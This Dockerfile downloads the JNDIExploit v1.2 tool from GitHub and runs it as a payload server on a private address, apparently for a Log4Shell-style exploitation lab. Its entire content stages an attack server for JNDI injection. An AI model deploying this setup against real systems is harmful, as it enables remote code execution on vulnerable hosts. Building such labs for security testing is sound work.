# syntax=docker/dockerfile:1

FROM debian:bullseye-slim  as build
WORKDIR /app
RUN  apt-get update \
  && apt-get install -y wget \
  && apt-get install -y unzip
RUN wget https://github.com/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip \
 && unzip JNDIExploit.v1.2.zip \
 && rm JNDIExploit.v1.2.zip

FROM openjdk:11-jdk-slim-bullseye
COPY --from=build /app/* /app/
CMD ["java", "-jar", "/app/JNDIExploit-1.2-SNAPSHOT.jar", "-i", "172.16.238.10", "-p", "8888"]